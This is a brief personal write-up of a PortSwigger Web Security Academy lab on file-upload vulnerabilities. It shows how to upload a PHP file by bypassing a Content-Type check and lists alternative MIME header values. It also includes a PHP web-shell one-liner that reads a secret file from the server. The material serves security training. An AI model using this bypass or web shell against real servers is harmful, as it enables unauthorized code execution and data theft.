https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

- log in
- When we upload any file we make a Post to `/my-account/avatar`, the app ask us to return to myAccount page 
- In my account page the img tag has a src attribute to `<img src="/files/avatars/filename.png" class="avatar">`}
- THe application in question only allows image/png contenttype but it doesn't validate whether the file extension match contenttype
- Load a file of php extension and use some of these values for the conten type header
```php
text/plain
text/x-php
application/x-php
application/x-httpd-php
application/x-httpd-php-source
```
- Use the script provided by portswigger.
- ``<?php echo file_get_contents('/home/carlos/secret'); ?>``
- ![[Pasted image 20250518135801.png]]
